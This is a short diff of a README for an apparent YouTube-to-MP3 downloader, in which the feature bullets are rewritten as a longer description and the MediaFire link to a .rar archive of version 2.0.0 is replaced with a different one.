@@ -1,11 +1,10 @@
 # Youtube2mp3
-- allow users to download multiple songs in one click
-- fast and easy to use
+- This application allows users to easily download audio tracks from YouTube videos in MP3 format. Designed with a user-friendly interface, it supports both single and multiple downloads, making it ideal for users who want to save their favorite music or podcasts from YouTube.
 
 ### Download
 | Mod Version| Version | Link |
 |----------|-------------|-----------------|
-| v2.0.0 | Version 2 | [Download](https://www.mediafire.com/file/m9rx0fjyfeoug1e/YoutubeToMP3.rar/file) 
+| v2.0.0 | Version 2 | [Download](https://www.mediafire.com/file/1cp6kjnsxn18fa2/YoutubetoMp3.rar/file) 
 
 ### Application
 
